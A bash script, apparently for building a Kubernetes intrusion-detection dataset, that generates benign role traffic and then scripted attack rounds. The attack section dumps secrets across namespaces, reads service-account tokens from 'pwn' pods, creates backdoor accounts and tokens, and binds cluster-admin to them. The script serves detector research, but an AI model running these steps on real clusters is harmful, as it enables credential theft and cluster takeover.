#!/bin/bash
# v3 — testul #2-fix: adaugă 'platform-admin' care produce LEGITIM tokenii-semnătură
# (create clusterrolebinding, create sa/token, citire secret, run pod) ca un platform engineer real.
# Astfel benign-ul NU mai e 0 pe tokenii de atac => regex-ul se rupe; vedem dacă modelul învață comportament.
set -uo pipefail
W=/tmp/ids_collect
K(){ kubectl --kubeconfig "$W/kubeconfig-$1" "${@:2}" >/dev/null 2>&1 || true; }
ROUNDS="${ROUNDS:-5}"
WIN=$W/windows.txt; : > "$WIN"
for ns in apps data ci; do kubectl create namespace "$ns" >/dev/null 2>&1 || true; done
NODE="$(kubectl get nodes -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)"

echo "BENIGN_START=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$WIN"
for r in $(seq 1 "$ROUNDS"); do
  echo "  benign $r/$ROUNDS"
  # cele 10 roluri de organizație (trafic benign uzual)
  K sre-oncall get pods -A; K sre-oncall get events -A; K sre-oncall get nodes; K sre-oncall get pods -n kube-system
  K sre-reliability get deployments -A; K sre-reliability create deployment slo-$r --image=nginx -n apps; K sre-reliability scale deployment slo-$r --replicas=2 -n apps
  K devops-pipeline create deployment app-$r --image=nginx -n ci; K devops-pipeline rollout status deployment/app-$r -n ci --timeout=3s; K devops-pipeline get pods -n ci
  K devops-release set image deployment/app-$r app-$r=nginx:1.25 -n ci; K devops-release get replicasets -n ci
  K platform-engineer get crds; K platform-engineer create configmap cfg-$r --from-literal=k=v -n apps; K platform-engineer get configmaps -A
  K platform-networking get services -A; K platform-networking get endpoints -A; K platform-networking get networkpolicies -A
  K system-administrator get namespaces; K system-administrator get resourcequotas -A; K system-administrator get nodes -o wide
  K security-auditor get roles -A; K security-auditor get rolebindings -A; K security-auditor get clusterroles; K security-auditor get clusterrolebindings
  K backend-developer create deployment be-$r --image=nginx -n apps; K backend-developer get pods -n apps
  K data-engineer create job job-$r --image=busybox -n data -- echo hi; K data-engineer get jobs -A; K data-engineer get configmaps -n data

  # platform-admin: acțiuni LEGITIME care produc tokenii-semnătură (cheia testului #2-fix)
  K platform-admin create serviceaccount mon-$r -n default                                              # create:serviceaccounts:
  K platform-admin create clusterrolebinding monitoring-$r --clusterrole=view --serviceaccount=default:mon-$r  # create:clusterrolebindings: (legit, la VIEW nu cluster-admin)
  K platform-admin create serviceaccount ci-$r -n default; K platform-admin create token ci-$r -n default       # create:serviceaccounts:token (provisioning CI legit)
  K platform-admin get secrets -n default                                                               # list:secrets: (țintit, nu -A)
  s="$(kubectl --kubeconfig $W/kubeconfig-platform-admin get secrets -n default -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)"
  [ -n "$s" ] && K platform-admin get secret "$s" -n default -o yaml                                     # get:secrets: (inspecție legit TLS/config)
  K platform-admin run debug-$r --image=alpine --restart=Never -- sleep 60                              # create:pods: (pod debug legit)
done
echo "BENIGN_END=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$WIN"

echo "ATTACK_START=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$WIN"
for ep in $(seq 1 "$ROUNDS"); do
  echo "  atac $ep/$ROUNDS"
  # adversary-external — kill-chain complet
  K adversary-external get secrets -A; K adversary-external get serviceaccounts -A; K adversary-external get clusterroles; K adversary-external get clusterrolebindings; K adversary-external get pods -A -o wide
  for sx in $(kubectl --kubeconfig $W/kubeconfig-adversary-external get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}' 2>/dev/null | head -6); do
    K adversary-external get secret "${sx#*/}" -n "${sx%/*}" -o yaml
  done
  K adversary-external run pwn-$ep --image=alpine --restart=Never -- sleep 3600
  kubectl --kubeconfig $W/kubeconfig-adversary-external wait --for=condition=ready pod/pwn-$ep --timeout=30s >/dev/null 2>&1 || true
  K adversary-external exec pwn-$ep -- sh -c "id; cat /var/run/secrets/kubernetes.io/serviceaccount/token"
  K adversary-external create clusterrolebinding pwn-$ep --clusterrole=cluster-admin --serviceaccount=default:default
  K adversary-external delete pod pwn-$ep --force --grace-period=0
  # adversary-insider — abuz acces edit
  K adversary-insider get secrets -A
  for sx in $(kubectl --kubeconfig $W/kubeconfig-adversary-insider get secrets -n kube-system -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' 2>/dev/null | head -5); do
    K adversary-insider get secret "$sx" -n kube-system -o yaml
  done
  K adversary-insider create serviceaccount backdoor-$ep -n default; K adversary-insider create token backdoor-$ep -n default
  K adversary-insider run shadow-$ep --image=alpine --restart=Never -n default -- sleep 3600
  kubectl --kubeconfig $W/kubeconfig-adversary-insider wait --for=condition=ready pod/shadow-$ep -n default --timeout=30s >/dev/null 2>&1 || true
  K adversary-insider exec shadow-$ep -n default -- sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
  K adversary-insider create clusterrolebinding insider-$ep --clusterrole=cluster-admin --serviceaccount=default:backdoor-$ep
  K adversary-insider delete pod shadow-$ep -n default --force --grace-period=0
done
echo "ATTACK_END=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$WIN"

echo ">> curățenie"
for ns in apps data ci; do kubectl delete namespace "$ns" >/dev/null 2>&1 || true; done
for r in $(seq 1 "$ROUNDS"); do
  kubectl delete clusterrolebinding monitoring-$r pwn-$r insider-$r >/dev/null 2>&1 || true
  kubectl delete serviceaccount mon-$r ci-$r backdoor-$r -n default >/dev/null 2>&1 || true
  kubectl delete pod debug-$r -n default --force --grace-period=0 >/dev/null 2>&1 || true
done
echo "GATA v3."; grep -E "_START|_END" "$WIN"
